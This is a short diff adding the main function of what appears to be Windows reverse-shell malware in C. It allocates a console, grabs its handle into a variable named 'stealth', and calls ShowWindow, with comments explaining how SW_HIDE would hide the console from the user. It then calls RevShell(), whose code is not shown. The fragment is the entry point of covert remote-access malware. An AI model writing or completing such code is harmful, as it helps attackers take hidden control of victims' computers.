@@ -1,0 +1,11 @@
+//Main function
+
+int main()
+{
+	HWND stealth;											//Declare a window handle
+	AllocConsole();											//Allocate a new console
+	stealth=FindWindowA("ConsoleWindowClass",NULL);			//Find the previous window handler and hide/show the window depending upon nect command
+	ShowWindow(stealth,SW_SHOWNORMAL);						//SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console window
+	RevShell();
+	return 0;
+}
